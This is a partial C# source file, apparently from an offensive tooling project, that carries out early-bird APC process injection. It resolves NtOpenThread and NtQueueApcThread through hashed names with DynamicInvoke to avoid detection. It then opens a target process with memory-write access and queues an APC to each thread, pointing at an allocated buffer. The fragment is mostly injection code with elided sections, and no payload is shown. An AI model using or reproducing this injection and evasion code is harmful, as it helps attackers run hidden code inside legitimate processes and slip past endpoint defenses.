...
namespace ProcessInjection
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ...
            var OpenThread = DynamicInvoke.GetDelegate<Native.NtOpenThread>("e2acb3a17c8f2b98c53e603bc422ca37", true);
            ...
            var QueueApcThread = DynamicInvoke.GetDelegate<Native.NtQueueApcThread>("72afc25600ebb940cc4a72e48808369a", true);
            ...
            #region early-bird Apc Injection
            ...
            OpenProcess(ref hProcess, Native.VirtualMemoryWrite | Native.VirtualMemoryOperation , ref objattrib, ref ProcessClientid);
            ...
            foreach (var thread in targetProcess.Threads) 
            {
                CLIENT_ID ThreadClientid = new CLIENT_ID
                {
                    UniqueThread = thread.ClientIdUniqueThread,
                };
                objattrib = new OBJECT_ATTRIBUTES();
                IntPtr hThread = IntPtr.Zero;
                OpenThread(ref hThread, Native.SET_CONTEXT, ref objattrib, ref ThreadClientid);
                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine("Cannot OpenThread");
                    continue;
                }
                QueueApcThread(hThread, hAllocated, 0, IntPtr.Zero, 0);
                Close(hThread);
            }
            #endregion
